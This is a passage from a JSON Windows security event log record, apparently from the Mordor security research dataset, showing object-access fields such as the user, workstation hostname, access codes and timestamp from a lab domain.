Count:\t0","AccessReason":"-","PrivilegeList":"-","@timestamp":"2020-09-22T08:22:44.454Z","SubjectLogonId":"0x10a7df","port":64545,"RecordNumber":820556,"SubjectUserName":"pgustavo","Task":12801,"SourceModuleName":"eventlog","Version":1,"AccessList":"%%1538\r\n\t\t\t\t%%4432\r\n\t\t\t\t%%4435\r\n\t\t\t\t%%4436\r\n\t\t\t\t","RestrictedSidCount":"0","ResourceAttributes":"-","Hostname":"WORKSTATION5.theshire.local","tags":["mordorDataset"]}
